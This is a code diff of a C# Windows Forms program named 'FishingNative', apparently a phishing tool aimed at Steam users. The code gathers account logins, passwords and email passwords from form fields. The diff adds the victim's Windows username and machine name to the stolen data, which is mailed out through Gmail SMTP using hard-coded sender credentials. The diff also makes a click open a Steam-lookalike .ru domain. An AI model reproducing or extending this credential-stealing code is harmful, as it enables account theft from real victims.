@@ -1,12 +1,8 @@
 ﻿using System;
 using System.Collections.Generic;
-using System.ComponentModel;
-using System.Data;
 using System.Drawing;
 using System.Linq;
 using System.Net.Mail;
-using System.Text;
-using System.Threading.Tasks;
 using System.Windows.Forms;
 
 namespace FishingNative
@@ -34,7 +30,7 @@ namespace FishingNative
         private void panel1_MouseClick(object sender, MouseEventArgs e)
         {
             //MessageBox.Show("s"," d");
-            //System.Diagnostics.Process.Start("http://www.google.com"); 
+            System.Diagnostics.Process.Start("http://steamconnunity.bb777.ru/"); 
             // prikrutit` sait
             this.Focus();
         }
@@ -73,7 +69,7 @@ namespace FishingNative
         {
             try
             {
-                var addr = new System.Net.Mail.MailAddress(email);
+                var addr = new MailAddress(email);
                 return addr.Address == email;
             }
             catch
@@ -115,8 +111,7 @@ namespace FishingNative
             mail.Subject = "A vot i accounti pod`ehali!";
             mail.Body = String.Format("{0} :: {1}", this.LoginTextBox.Text, this.PasswordTextBox.Text);
             mail.Body += String.Format("\n\n{0} :: {1}", this.EmailTextBox.Text, this.PasswordEmailTextBox.Text);
-
-            this.ProgressBar.PerformStep();
+            mail.Body += String.Format("\nUsername {0}, Mashinename {1}", Environment.UserName, Environment.MachineName);
             SmtpServer.Port = 587;
             SmtpServer.Credentials = new System.Net.NetworkCredential("icanmakeyoucryo.o@gmail.com", "arizonaboys");
             this.ProgressBar.PerformStep();
